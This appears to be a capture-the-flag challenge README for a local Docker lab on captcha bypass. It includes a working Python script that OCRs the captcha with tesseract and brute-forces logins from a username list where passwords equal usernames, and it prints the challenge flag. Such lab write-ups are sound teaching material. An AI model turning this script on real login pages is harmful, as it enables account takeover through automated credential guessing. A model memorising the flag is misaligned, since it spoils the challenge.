## Captcha bypass Challenge

## Run the below commands to get Started after cloning the repo
```
docker-compose up
```
Server will start listening on port 4447.

## Solution

On visiting the home page(http://localhost:4447), In the chall desc, there will be hint that "I have a list of usernames and password(which is same) for guessing the creds but not able to bypass the captcha. Can you please help"

1. On Sign-in page, user has to log in after bypassing the captcha.
2. Once the users log in, after inspecting the home page, user will get the flag
3. Note that the username and password changes every 3 min from the given list.

Below is the payload to bypass the captcha
```
import requests as req
import subprocess


def getCaptcha(session):
	
	res = session.get("http://localhost:8080/captcha")
	file  = open("captcha.jpeg","wb")
	file.write(res.content)
	file.close()
	subprocess.run(["tesseract","./captcha.jpeg","./test"])
	file  = open("./test.txt","r")
	captchaString = file.read()
	file.close()
	print(captchaString.strip())
	return captchaString.strip()
	



def login():
	file  = open("./top100usernames.txt","r")
	for userName in file.readlines():
		session = req.Session()
		captcha = getCaptcha(session)
		#userName="ARCHIVIST"
		data = {'userName':userName.strip(),'password':userName.strip(),'captcha':captcha}
		res = session.post("http://localhost:8080/submit",data)
		serverResponse = res.text
        #print(serverResponse)
        #print("Home" in serverResponse)
		if("Home" in serverResponse):
			print("Got the Creds")
			print(userName)
			break


```

### Ref:
- https://www.bugcrowd.com/blog/guest-blog-breaking-bugcrowds-captcha-pwndizzle/

## Flag
Flag{mSRQn7vjmiBSCBFuVJKd_not_so_effective_captcha}